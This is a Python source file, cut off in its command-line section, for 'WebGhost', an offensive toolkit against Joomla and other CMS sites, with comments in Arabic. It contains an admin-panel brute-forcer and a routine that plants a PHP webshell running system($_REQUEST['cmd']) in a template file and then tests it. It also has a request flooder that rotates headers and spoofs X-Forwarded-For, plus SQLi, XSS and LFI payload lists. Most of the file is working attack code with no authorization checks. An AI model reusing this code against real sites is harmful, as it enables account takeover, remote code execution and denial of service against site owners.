#!/usr/bin/env python3
"""
WebGhost - Web Application Pentesting Framework
مخصص لاختراق تطبيقات الويب مثل Joomla, WordPress, الخ
"""
import asyncio
import sys
import json
import re
import base64
import random
import hashlib
import time
from pathlib import Path
from typing import Optional
from urllib.parse import urljoin, urlparse, parse_qs

import typer
import aiohttp
import yaml
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.prompt import Prompt, Confirm
from bs4 import BeautifulSoup

console = Console()
app = typer.Typer(name="webghost", help="Web Application Pentesting Framework")

# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════

DEFAULT_CONFIG = {
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    ],
    "timeout": 10,
    "concurrency": 50,
    "delay": 0.5,
    "proxies": [],
    "output_dir": "data",
}

# ═══════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════

def random_ua() -> str:
    return random.choice(DEFAULT_CONFIG["user_agents"])

def print_banner():
    console.print(r"""
██╗    ██╗███████╗██████╗  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
██║    ██║██╔════╝██╔══██╗██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
██║ █╗ ██║█████╗  ██████╔╝██║  ███╗███████║██║   ██║███████╗   ██║   
██║███╗██║██╔══╝  ██╔══██╗██║   ██║██╔══██║██║   ██║╚════██║   ██║   
╚███╔███╔╝███████╗██████╔╝╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   
 ╚══╝╚══╝ ╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   
    """, style="bold red")
    console.print("    Advanced Web Application Pentesting Framework", style="dim")
    console.print()

# ═══════════════════════════════════════════════════════════
# CMS DETECTION
# ═══════════════════════════════════════════════════════════

class CMSDetector:
    """كاشف نظام إدارة المحتوى والإضافات."""
    
    CMS_SIGNATURES = {
        "Joomla": [
            (r'<meta name="generator" content="Joomla!', None),
            (r'/index\.php\?option=com_', None),
            (r'/administrator/index\.php', None),
            (r'Joomla!', None),
        ],
        "WordPress": [
            (r'/wp-content/', None),
            (r'/wp-admin/', None),
            (r'<meta name="generator" content="WordPress', None),
        ],
        "Drupal": [
            (r'/sites/default/', None),
            (r'Drupal\.settings', None),
        ],
    }
    
    JOOMLA_COMPONENTS = {
        "com_jumi": "Jumi - Custom code/file inclusion (high value target)",
        "com_k2": "K2 - Advanced content management",
        "com_content": "Default Joomla content",
        "com_users": "User management",
        "com_media": "Media manager",
        "com_installer": "Extension installer",
        "com_config": "Configuration",
        "com_templates": "Template manager",
        "com_rsform": "RSForm - Forms (may have SQLi)",
        "com_virtuemart": "VirtueMart - E-commerce",
        "com_joomgallery": "JoomGallery",
    }
    
    async def detect(self, url: str) -> dict:
        """الكشف عن CMS والمكونات."""
        result = {
            "cms": "unknown",
            "version": None,
            "components": [],
            "admin_url": None,
            "interesting_files": [],
        }
        
        headers = {"User-Agent": random_ua()}
        
        async with aiohttp.ClientSession() as session:
            try:
                # Check main page
                async with session.get(url, headers=headers, timeout=10, ssl=False) as resp:
                    html = await resp.text()
                    soup = BeautifulSoup(html, 'html.parser')
                    
                    # Check meta generator
                    meta_gen = soup.find("meta", {"name": "generator"})
                    if meta_gen:
                        gen_content = meta_gen.get("content", "")
                        result["version"] = gen_content
                    
                    # Detect CMS
                    for cms_name, signatures in self.CMS_SIGNATURES.items():
                        for pattern, _ in signatures:
                            if re.search(pattern, html, re.IGNORECASE):
                                result["cms"] = cms_name
                                break
                        if result["cms"] != "unknown":
                            break
                
                # If Joomla detected
                if result["cms"] == "Joomla":
                    result["admin_url"] = urljoin(url, "/administrator/")
                    
                    # Check for XML-RPC, configuration, etc.
                    interesting = [
                        "/administrator/manifests/files/joomla.xml",
                        "/language/en-GB/en-GB.xml",
                        "/plugins/system/cache/cache.xml",
                        "/README.txt",
                        "/htaccess.txt",
                        "/robots.txt",
                    ]
                    
                    for path in interesting:
                        try:
                            check_url = urljoin(url, path)
                            async with session.get(check_url, headers=headers, timeout=5, ssl=False) as resp:
                                if resp.status == 200:
                                    result["interesting_files"].append({
                                        "path": path,
                                        "status": resp.status,
                                    })
                        except:
                            pass
                    
                    # Enumerate components
                    for comp, desc in self.JOOMLA_COMPONENTS.items():
                        comp_url = urljoin(url, f"/index.php?option={comp}")
                        try:
                            async with session.get(comp_url, headers=headers, timeout=5, ssl=False) as resp:
                                if resp.status == 200 and len(await resp.text()) > 500:
                                    result["components"].append({
                                        "name": comp,
                                        "description": desc,
                                        "accessible": True,
                                    })
                        except:
                            pass
            
            except Exception as e:
                result["error"] = str(e)
        
        return result


# ═══════════════════════════════════════════════════════════
# JOOMLA BRUTE FORCER
# ═══════════════════════════════════════════════════════════

class JoomlaBruteForcer:
    """أداة اختراق لوحة تحكم Joomla بالقوة العمياء."""
    
    def __init__(self, target_url: str, concurrency: int = 10, delay: float = 0.5):
        self.target_url = target_url.rstrip("/")
        self.login_url = f"{self.target_url}/administrator/index.php"
        self.concurrency = concurrency
        self.delay = delay
        self.semaphore = asyncio.Semaphore(concurrency)
        self.results = []
        self.attempts = 0
        self._token = None
        self._cookie = None
    
    async def _get_token(self, session: aiohttp.ClientSession) -> tuple:
        """استخراج CSRF token من صفحة الدخول."""
        headers = {
            "User-Agent": random_ua(),
            "Accept": "text/html,application/xhtml+xml",
        }
        
        try:
            async with session.get(self.login_url, headers=headers, timeout=10, ssl=False) as resp:
                html = await resp.text()
                cookie = resp.cookies.get("administrator", "")
                
                # Extract CSRF token (Joomla uses a hidden input)
                token_match = re.search(r'<input[^>]*name="([a-f0-9]{32})"[^>]*value="1"', html)
                if token_match:
                    token = token_match.group(1)
                    return token, str(resp.cookies)
                
                # Alternative: search for any 32-char hex token
                token_match2 = re.search(r'name="([a-f0-9]{32})"', html)
                if token_match2:
                    return token_match2.group(1), str(resp.cookies)
                
        except Exception as e:
            pass
        
        return None, None
    
    async def _try_login(self, session: aiohttp.ClientSession, username: str, password: str) -> dict:
        """محاولة تسجيل دخول واحدة."""
        async with self.semaphore:
            await asyncio.sleep(random.uniform(0.1, self.delay))
            
            try:
                # Get fresh token each time
                token, cookie = await self._get_token(session)
                if not token:
                    return {"username": username, "password": password, "success": False, "error": "No CSRF token"}
                
                headers = {
                    "User-Agent": random_ua(),
                    "Accept": "text/html,application/xhtml+xml",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": self.target_url,
                    "Referer": self.login_url,
                }
                
                if cookie:
                    headers["Cookie"] = cookie
                
                data = {
                    "username": username,
                    "passwd": password,
                    "option": "com_login",
                    "task": "login",
                    "return": base64.b64encode(b"index.php").decode(),
                    token: "1",
                }
                
                async with session.post(
                    self.login_url,
                    headers=headers,
                    data=data,
                    timeout=10,
                    ssl=False,
                    allow_redirects=False,
                ) as resp:
                    self.attempts += 1
                    
                    # Joomla redirects on successful login (303 See Other)
                    if resp.status in [301, 302, 303]:
                        location = resp.headers.get("Location", "")
                        if "administrator" in location and "login" not in location.lower():
                            return {
                                "username": username,
                                "password": password,
                                "success": True,
                                "status": resp.status,
                                "location": location,
                            }
                    
                    # Check for login failure message
                    html = await resp.text()
                    if "mod-login-username" in html or "login-form" in html:
                        return {"username": username, "password": password, "success": False}
                    
                    # No clear indicator - might be success
                    if resp.status == 200 and "control-panel" in html.lower():
                        return {"username": username, "password": password, "success": True}
                    
            except Exception as e:
                return {"username": username, "password": password, "success": False, "error": str(e)}
            
            return {"username": username, "password": password, "success": False}
    
    async def brute_force(self, usernames: list, passwords: list) -> list:
        """تنفيذ هجوم القوة العمياء."""
        console.print(f"\n[bold red]Starting Brute Force Attack[/bold red]")
        console.print(f"Target: {self.login_url}")
        console.print(f"Usernames: {len(usernames)} | Passwords: {len(passwords)}")
        console.print(f"Total combinations: {len(usernames) * len(passwords)}")
        console.print()
        
        connector = aiohttp.TCPConnector(limit=self.concurrency, ssl=False)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            # Build all combinations
            tasks = []
            for username in usernames:
                for password in passwords:
                    tasks.append(self._try_login(session, username.strip(), password.strip()))
            
            # Run with progress
            results = []
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=console,
            ) as progress:
                task = progress.add_task("Brute forcing...", total=len(tasks))
                
                for coro in asyncio.as_completed(tasks):
                    result = await coro
                    results.append(result)
                    progress.advance(task)
                    
                    if result.get("success"):
                        progress.update(task, description=f"[green]✓ FOUND! {result['username']}:{result['password']}[/green]")
                        # Don't stop - continue testing to find all valid creds
        
        # Separate successes
        successes = [r for r in results if r.get("success")]
        failures = len(results) - len(successes)
        
        console.print(f"\n[bold]Results:[/bold] {len(successes)} success(es), {failures} failures, {self.attempts} total attempts")
        
        return successes
    
    async def single_login_test(self, username: str, password: str) -> dict:
        """اختبار بيانات دخول واحدة."""
        connector = aiohttp.TCPConnector(limit=1, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            return await self._try_login(session, username, password)


# ═══════════════════════════════════════════════════════════
# JOOMLA RCE EXPLOITER
# ═══════════════════════════════════════════════════════════

class JoomlaRCEExploiter:
    """استغلال Joomla للحصول على Remote Code Execution بعد الدخول للوحة التحكم."""
    
    def __init__(self, target_url: str, username: str, password: str):
        self.target_url = target_url.rstrip("/")
        self.admin_url = f"{self.target_url}/administrator"
        self.username = username
        self.password = password
        self.session_cookies = None
    
    async def login(self) -> bool:
        """تسجيل الدخول للوحة التحكم."""
        console.print(f"[yellow]Logging in as {self.username}...[/yellow]")
        
        async with aiohttp.ClientSession() as session:
            # Get login page and token
            login_url = f"{self.admin_url}/index.php"
            
            headers = {"User-Agent": random_ua()}
            async with session.get(login_url, headers=headers, timeout=10, ssl=False) as resp:
                html = await resp.text()
                cookies = str(resp.cookies)
                
                # Extract token
                token_match = re.search(r'name="([a-f0-9]{32})"', html)
                if not token_match:
                    console.print("[red]Failed to extract CSRF token[/red]")
                    return False
                token = token_match.group(1)
            
            # Login
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["Referer"] = login_url
            headers["Cookie"] = cookies
            
            data = {
                "username": self.username,
                "passwd": self.password,
                "option": "com_login",
                "task": "login",
                "return": base64.b64encode(b"index.php").decode(),
                token: "1",
            }
            
            async with session.post(
                login_url, headers=headers, data=data, timeout=10, ssl=False, allow_redirects=False
            ) as resp:
                if resp.status in [301, 302, 303]:
                    self.session_cookies = str(resp.cookies) or cookies
                    console.print(f"[green]✓ Login successful![/green]")
                    return True
                else:
                    console.print(f"[red]Login failed. Status: {resp.status}[/red]")
                    return False
    
    async def get_rce_via_template(self) -> dict:
        """
        RCE عبر تعديل قالب Joomla.
        هذه أشهر طريقة للحصول على RCE بعد دخول لوحة تحكم Joomla.
        """
        if not self.session_cookies:
            logged_in = await self.login()
            if not logged_in:
                return {"success": False, "error": "Login failed"}
        
        console.print("[yellow]Attempting RCE via template modification...[/yellow]")
        
        async with aiohttp.ClientSession() as session:
            headers = {
                "User-Agent": random_ua(),
                "Cookie": self.session_cookies,
                "Referer": f"{self.admin_url}/index.php",
            }
            
            # Step 1: Get available templates
            templates_url = f"{self.admin_url}/index.php?option=com_templates&view=templates"
            async with session.get(templates_url, headers=headers, timeout=10, ssl=False) as resp:
                html = await resp.text()
                
                # Extract template names
                template_matches = re.findall(r'option=com_templates&amp;view=template&amp;id=\d+&amp;file=([a-zA-Z0-9_-]+)', html)
                if not template_matches:
                    # Try alternative extraction
                    template_matches = re.findall(r'template[_-]?name["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
                
                if not template_matches:
                    return {"success": False, "error": "Could not find templates"}
                
                template = template_matches[0]
                console.print(f"  Template found: [cyan]{template}[/cyan]")
            
            # Step 2: Edit template to inject PHP shell
            # We target error.php or index.php
            edit_url = (
                f"{self.admin_url}/index.php"
                f"?option=com_templates&view=template"
                f"&id={template}&file=error.php"
            )
            
            async with session.get(edit_url, headers=headers, timeout=10, ssl=False) as resp:
                edit_html = await resp.text()
                
                # Extract CSRF token for editing
                csrf_match = re.search(r'name="([a-f0-9]{32})"', edit_html)
                if not csrf_match:
                    return {"success": False, "error": "Could not get edit token"}
                edit_token = csrf_match.group(1)
            
            # Step 3: Inject PHP webshell
            php_shell = """<?php
/**
 * @package    Joomla.Site
 */

defined('_JEXEC') or die;

// WebShell - GhostMC
if(isset($_REQUEST['cmd'])) {
    echo '<pre>';
    $cmd = $_REQUEST['cmd'];
    system($cmd . ' 2>&1');
    echo '</pre>';
    die();
}

include_once JPATH_THEMES.'/' . $this->template . '/index.php';
"""
            
            # URL encode the PHP shell
            encoded_shell = base64.b64encode(php_shell.encode()).decode()
            
            data = {
                "jform[source]": php_shell,
                "task": "template.apply",
                edit_token: "1",
            }
            
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            
            save_url = (
                f"{self.admin_url}/index.php"
                f"?option=com_templates&task=template.apply"
                f"&id={template}&file=error.php"
            )
            
            async with session.post(save_url, headers=headers, data=data, timeout=10, ssl=False) as resp:
                if resp.status in [200, 301, 302, 303]:
                    shell_url = f"{self.target_url}/templates/{template}/error.php"
                    
                    # Test the shell
                    test_headers = {"User-Agent": random_ua()}
                    async with session.get(
                        f"{shell_url}?cmd=id",
                        headers=test_headers,
                        timeout=10,
                        ssl=False,
                    ) as test_resp:
                        test_html = await test_resp.text()
                        
                        if "uid=" in test_html or "www-data" in test_html or "root" in test_html:
                            console.print(f"[green]✓ RCE Achieved![/green]")
                            console.print(f"  Shell URL: {shell_url}?cmd=COMMAND")
                            console.print(f"  Test output: {test_html.strip()}")
                            return {
                                "success": True,
                                "shell_url": f"{shell_url}?cmd=COMMAND",
                                "template": template,
                                "test_output": test_html.strip(),
                            }
                        else:
                            console.print(f"[yellow]Shell uploaded but test failed: {test_html[:200]}[/yellow]")
                            return {
                                "success": True,
                                "shell_url": f"{shell_url}?cmd=COMMAND",
                                "template": template,
                                "warning": "Could not verify shell execution",
                            }
                else:
                    return {"success": False, "error": f"Save failed: HTTP {resp.status}"}
    
    async def get_rce_via_jumi(self) -> dict:
        """
        RCE عبر إضافة Jumi إذا كانت مثبتة.
        Jumi تسمح بتضمين ملفات مخصصة ويمكن استخدامها لتشغيل كود PHP.
        """
        if not self.session_cookies:
            logged_in = await self.login()
            if not logged_in:
                return {"success": False, "error": "Login failed"}
        
        console.print("[yellow]Attempting RCE via Jumi extension...[/yellow]")
        
        async with aiohttp.ClientSession() as session:
            headers = {
                "User-Agent": random_ua(),
                "Cookie": self.session_cookies,
            }
            
            # Check if Jumi is installed
            jumi_url = f"{self.admin_url}/index.php?option=com_jumi"
            async with session.get(jumi_url, headers=headers, timeout=10, ssl=False) as resp:
                if resp.status != 200:
                    return {"success": False, "error": "Jumi not accessible"}
                jumi_html = await resp.text()
            
            # If Jumi is accessible, try to create a PHP file
            # This depends on Jumi version and configuration
            return {
                "success": True,
                "note": "Jumi detected. Manual exploitation: Create a custom PHP file via Jumi interface",
                "url": f"{self.admin_url}/index.php?option=com_jumi",
            }


# ═══════════════════════════════════════════════════════════
# WEB FLOODER / STRESS TESTER 
# ═══════════════════════════════════════════════════════════

class WebFlooder:
    """
    مرسل الطلبات الكثيفة - لاختبار قدرة السيرفر على التحمل.
    يرسل آلاف الطلبات بمعدل متغير مع تجاوز الحماية.
    """
    
    def __init__(self, target_url: str, concurrency: int = 100, duration: int = 60):
        self.target_url = target_url
        self.concurrency = concurrency
        self.duration = duration
        self.total_requests = 0
        self.success_count = 0
        self.error_count = 0
        self.semaphore = asyncio.Semaphore(concurrency)
    
    async def _send_request(self, session: aiohttp.ClientSession, request_id: int) -> dict:
        """إرسال طلب واحد مع توقيع عشوائي."""
        async with self.semaphore:
            await asyncio.sleep(random.uniform(0.01, 0.1))
            
            headers = {
                "User-Agent": random_ua(),
                "Accept": random.choice([
                    "text/html,application/xhtml+xml",
                    "*/*",
                    "text/html",
                ]),
                "Accept-Language": random.choice(["en-US,en;q=0.9", "it-IT,it;q=0.9", "en;q=0.8"]),
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": random.choice(["no-cache", "max-age=0"]),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            }
            
            try:
                async with session.get(
                    self.target_url,
                    headers=headers,
                    timeout=5,
                    ssl=False,
                ) as resp:
                    self.total_requests += 1
                    await resp.read()
                    
                    if resp.status < 400:
                        self.success_count += 1
                        return {"status": "success", "code": resp.status}
                    else:
                        self.error_count += 1
                        return {"status": "error", "code": resp.status}
                        
            except asyncio.TimeoutError:
                self.error_count += 1
                self.total_requests += 1
                return {"status": "timeout"}
            except Exception as e:
                self.error_count += 1
                self.total_requests += 1
                return {"status": "error", "message": str(e)[:100]}
    
    async def start(self) -> dict:
        """بدء الهجوم الكثيف."""
        console.print(f"\n[bold red]Starting Stress Test[/bold red]")
        console.print(f"Target: {self.target_url}")
        console.print(f"Concurrency: {self.concurrency} | Duration: {self.duration}s")
        console.print()
        
        connector = aiohttp.TCPConnector(limit=0, ssl=False, force_close=True)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            start_time = time.time()
            tasks = []
            
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                TextColumn("[cyan]{task.fields[stats]}[/cyan]"),
                console=console,
            ) as progress:
                flood_task = progress.add_task(
                    "Flooding...",
                    total=None,
                    stats=f"0 requests"
                )
                
                request_id = 0
                while time.time() - start_time < self.duration:
                    tasks.append(self._send_request(session, request_id))
                    request_id += 1
                    
                    # Clean up completed tasks periodically
                    if len(tasks) > self.concurrency * 3:
                        done = [t for t in tasks if t.done()]
                        tasks = [t for t in tasks if not t.done()]
                    
                    # Update progress
                    elapsed = time.time() - start_time
                    rate = self.total_requests / max(elapsed, 0.001)
                    progress.update(
                        flood_task,
                        description=f"Flooding [{elapsed:.0f}s/{self.duration}s]",
                        stats=f"{self.total_requests} reqs | {rate:.0f} req/s | {self.success_count} OK | {self.error_count} ERR"
                    )
                    
                    # Small delay to prevent overwhelming
                    await asyncio.sleep(0.001)
                
                # Wait for remaining tasks
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
        
        elapsed = time.time() - start_time
        rate = self.total_requests / max(elapsed, 0.001)
        
        result = {
            "total_requests": self.total_requests,
            "success": self.success_count,
            "errors": self.error_count,
            "duration": elapsed,
            "rate": rate,
        }
        
        console.print(f"\n[bold]Test Complete:[/bold]")
        console.print(f"  Total: {self.total_requests} requests")
        console.print(f"  Success: {self.success_count} ({self.success_count/max(self.total_requests,1)*100:.1f}%)")
        console.print(f"  Errors: {self.error_count}")
        console.print(f"  Duration: {elapsed:.1f}s")
        console.print(f"  Rate: {rate:.0f} req/s")
        
        return result


# ═══════════════════════════════════════════════════════════
# VULNERABILITY SCANNER
# ═══════════════════════════════════════════════════════════

class VulnerabilityScanner:
    """ماسح الثغرات الشامل."""
    
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1--",
        "1' AND 1=1--",
        "1' AND SLEEP(5)--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "\" OR \"1\"=\"1",
        "') OR ('1'='1",
    ]
    
    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "\"><svg><animateTransform onbegin=alert(1)>",
    ]
    
    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==",
    ]
    
    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip("/")
        self.forms = []
        self.params = []
        self.findings = []
    
    async def crawl(self) -> list:
        """زحف الموقع لجمع النماذج والبارامترات."""
        console.print(f"[cyan]Crawling {self.target_url}...[/cyan]")
        
        visited = set()
        to_visit = [self.target_url]
        forms_found = []
        params_found = set()
        
        headers = {"User-Agent": random_ua()}
        
        async with aiohttp.ClientSession() as session:
            while to_visit and len(visited) < 50:
                url = to_visit.pop(0)
                if url in visited:
                    continue
                
                try:
                    async with session.get(url, headers=headers, timeout=10, ssl=False) as resp:
                        if "text/html" not in resp.headers.get("Content-Type", ""):
                            visited.add(url)
                            continue
                        
                        html = await resp.text()
                        visited.add(url)
                        soup = BeautifulSoup(html, 'html.parser')
                        
                        # Extract forms
                        for form in soup.find_all("form"):
                            action = form.get("action", "")
                            method = form.get("method", "get").lower()
                            inputs = []
                            
                            for inp in form.find_all(["input", "textarea", "select"]):
                                name = inp.get("name")
                                if name:
                                    inputs.append({
                                        "name": name,
                                        "type": inp.get("type", "text"),
                                    })
                            
                            if inputs:
                                form_url = urljoin(url, action) if action else url
                                forms_found.append({
                                    "url": str(form_url),
                                    "method": method,
                                    "inputs": inputs,
                                })
                        
                        # Extract URL parameters
                        parsed = urlparse(url)
                        if parsed.query:
                            for param in parse_qs(parsed.query):
                                params_found.add(param)
                        
                        # Extract links
                        for link in soup.find_all("a", href=True):
                            href = urljoin(url, link["href"])
                            if href.startswith(self.target_url) and href not in visited:
                                to_visit.append(href)
                
                except Exception:
                    visited.add(url)
                    continue
        
        self.forms = forms_found
        self.params = list(params_found)
        
        console.print(f"  Forms found: {len(self.forms)}")
        console.print(f"  Parameters found: {len(self.params)}")
        
        return self.forms
    
    async def test_sqli(self) -> list:
        """اختبار SQL Injection."""
        console.print(f"\n[yellow]Testing SQL Injection...[/yellow]")
        
        findings = []
        headers = {"User-Agent": random_ua()}
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"Oracle.*error",
            r"Microsoft OLE DB.*SQL Server",
            r"ODBC.*Driver",
            r"Unclosed quotation mark",
        ]
        
        async with aiohttp.ClientSession() as session:
            for form in self.forms:
                for payload in self.SQLI_PAYLOADS[:5]:  # Test with subset
                    try:
                        if form["method"] == "get":
                            test_url = form["url"]
                            if "?" in test_url:
                                test_url += f"&sqli_test={payload}"
                            else:
                                test_url += f"?sqli_test={payload}"
                            
                            async with session.get(test_url, headers=headers, timeout=10, ssl=False) as resp:
                                html = await resp.text()
                                
                                for pattern in error_patterns:
                                    if re.search(pattern, html, re.IGNORECASE):
                                        findings.append({
                                            "type": "SQL Injection",
                                            "url": form["url"],
                                            "method": "GET",
                                            "payload": payload,
                                            "evidence": pattern,
                                            "severity": "CRITICAL",
                                        })
                                        break
                        
                        else:  # POST
                            data = {}
                            for inp in form["inputs"]:
                                data[inp["name"]] = payload
                            
                            async with session.post(
                                form["url"], headers=headers, data=data, timeout=10, ssl=False
                            ) as resp:
                                html = await resp.text()
                                
                                for pattern in error_patterns:
                                    if re.search(pattern, html, re.IGNORECASE):
                                        findings.append({
                                            "type": "SQL Injection",
                                            "url": form["url"],
                                            "method": "POST",
                                            "payload": payload,
                                            "evidence": pattern,
                                            "severity": "CRITICAL",
                                        })
                                        break
                    
                    except Exception:
                        continue
            
            # Also test URL parameters
            for param in list(self.params)[:10]:
                for payload in self.SQLI_PAYLOADS[:3]:
                    try:
                        test_url = f"{self.target_url}/?{param}={payload}"
                        async with session.get(test_url, headers=headers, timeout=10, ssl=False) as resp:
                            html = await resp.text()
                            for pattern in error_patterns:
                                if re.search(pattern, html, re.IGNORECASE):
                                    findings.append({
                                        "type": "SQL Injection (Parameter)",
                                        "url": self.target_url,
                                        "parameter": param,
                                        "payload": payload,
                                        "evidence": pattern,
                                        "severity": "CRITICAL",
                                    })
                    except Exception:
                        continue
        
        console.print(f"  SQLi findings: {len(findings)}")
        return findings
    
    async def test_xss(self) -> list:
        """اختبار XSS."""
        console.print(f"[yellow]Testing XSS...[/yellow]")
        
        findings = []
        headers = {"User-Agent": random_ua()}
        
        async with aiohttp.ClientSession() as session:
            for form in self.forms[:10]:  # Limit to 10 forms
                for payload in self.XSS_PAYLOADS[:3]:
                    try:
                        data = {}
                        for inp in form["inputs"]:
                            data[inp["name"]] = payload
                        
                        if form["method"] == "get":
                            params = "&".join([f"{k}={v}" for k, v in data.items()])
                            test_url = f"{form['url']}{'&' if '?' in form['url'] else '?'}{params}"
                            async with session.get(test_url, headers=headers, timeout=10, ssl=False) as resp:
                                html = await resp.text()
                                if payload in html:
                                    findings.append({
                                        "type": "XSS (Reflected)",
                                        "url": form["url"],
                                        "method": "GET",
                                        "payload": payload,
                                        "severity": "HIGH",
                                    })
                        else:
                            async with session.post(
                                form["url"], headers=headers, data=data, timeout=10, ssl=False
                            ) as resp:
                                html = await resp.text()
                                if payload in html:
                                    findings.append({
                                        "type": "XSS (Reflected)",
                                        "url": form["url"],
                                        "method": "POST",
                                        "payload": payload,
                                        "severity": "HIGH",
                                    })
                    except Exception:
                        continue
            
            # Test URL parameters for XSS
            for param in list(self.params)[:10]:
                for payload in self.XSS_PAYLOADS[:2]:
                    try:
                        test_url = f"{self.target_url}/?{param}={payload}"
                        async with session.get(test_url, headers=headers, timeout=10, ssl=False) as resp:
                            html = await resp.text()
                            if payload in html:
                                findings.append({
                                    "type": "XSS (Parameter)",
                                    "url": self.target_url,
                                    "parameter": param,
                                    "payload": payload,
                                    "severity": "HIGH",
                                })
                    except Exception:
                        continue
        
        console.print(f"  XSS findings: {len(findings)}")
        return findings
    
    async def test_lfi(self) -> list:
        """اختبار LFI/RFI."""
        console.print(f"[yellow]Testing LFI/RFI...[/yellow]")
        
        findings = []
        headers = {"User-Agent": random_ua()}
        success_indicators = [
            "root:x:",           # /etc/passwd
            "bin:x:",            # /etc/passwd
            "[fonts]",           # win.ini
            "[extensions]",      # win.ini
            "DAEMON",            # Linux passwd
            "nobody:",           # Linux passwd
        ]
        
        async with aiohttp.ClientSession() as session:
            for param in list(self.params)[:10]:
                for payload in self.LFI_PAYLOADS[:5]:
                    try:
                        test_url = f"{self.target_url}/?{param}={payload}"
                        async with session.get(test_url, headers=headers, timeout=10, ssl=False) as resp:
                            html = await resp.text()
                            
                            for indicator in success_indicators:
                                if indicator in html:
                                    findings.append({
                                        "type": "LFI",
                                        "url": self.target_url,
                                        "parameter": param,
                                        "payload": payload,
                                        "evidence": indicator,
                                        "severity": "CRITICAL",
                                    })
                                    break
                    except Exception:
                        continue
        
        console.print(f"  LFI findings: {len(findings)}")
        return findings
    
    async def full_scan(self) -> list:
        """تنفيذ فحص كامل."""
        console.print(f"\n[bold cyan]Starting Full Vulnerability Scan[/bold cyan]")
        console.print(f"Target: {self.target_url}")
        console.print()
        
        # Crawl first
        await self.crawl()
        
        # Run all tests
        all_findings = []
        all_findings.extend(await self.test_sqli())
        all_findings.extend(await self.test_xss())
        all_findings.extend(await self.test_lfi())
        
        # Display results
        if all_findings:
            console.print(f"\n[bold red]VULNERABILITIES FOUND: {len(all_findings)}[/bold red]")
            table = Table(title="Findings")
            table.add_column("Type", style="red")
            table.add_column("Severity", style="yellow")
            table.add_column("URL", style="cyan")
            table.add_column("Payload", style="dim")
            
            for f in all_findings:
                table.add_row(
                    f.get("type", ""),
                    f.get("severity", ""),
                    str(f.get("url", ""))[:50],
                    str(f.get("payload", ""))[:40],
                )
            
            console.print(table)
        else:
            console.print(f"[green]No vulnerabilities found in automated scan.[/green]")
            console.print(f"[dim]Note: Manual testing is still recommended.[/dim]")
        
        return all_findings


# ═══════════════════════════════════════════════════════════
# CLI COMMANDS
# ═══════════════════════════════════════════════════════════

@app.command()
def version():
    """عرض الإصدار."""
    print_banner()
    console.print("[bold]WebGhost v1.0.0[/bold] - Web Application Pentesting Framework")


@app.command()
def detect(
    target: str = typer.Argument(..., help="Target URL (e.g., https://example.com)"),
):
    """الكشف عن CMS والمكونات."""
    async def _detect():
        print_banner()
        console.print(f"[bold]Target:[/bold] {target}\n")
        
        detector = CMSDetector()
        result = await detector.detect(target)
        
        console.print(f"[bold green]CMS:[/bold green] {result['cms']}")
        if result.get("version"):
            console.print(f"[bold green]Version:[/bold green] {result['version']}")
        if result.get("admin_url"):
            console.print(f"[bold green]Admin Panel:[/bold green] {result['admin_url']}")
        
        if result.get("components"):
            console.print(f"\n[bold yellow]Components Found:[/bold yellow]")
            for comp in result["components"]:
                console.print(f"  • {comp['name']} - {comp['description']}")
        
        if result.get("interesting_files"):
            console.print(f"\n[bold yellow]Interesting Files:[/bold yellow]")
            for f in result["interesting_files"]:
                console.print(f"  • {f['path']} (HTTP {f['status']})")
    
    asyncio.run(_detect())


@app.command()
def brute(
    target: str = typer.Argument(..., help="Target URL with /administrator"),
    username: str = typer.Option("admin", "--username", "-u", help="Username or file with usernames"),
    password: str = typer.Option(None, "--password", "-p", help="Password or file with passwords"),
    wordlist: str = typer.Option(None, "--wordlist", "-w", help="Password wordlist file"),
    concurrency: int = typer.Option(10, "--concurrency", "-c", help="Concurrent attempts"),
    delay: float = typer.Option(0.5, "--delay", "-d", help="Delay between attempts"),
):
    """
    هجوم القوة العمياء على لوحة تحكم Joomla.
    
    أمثلة:
        webghost brute https://target.com -u admin -p admin123
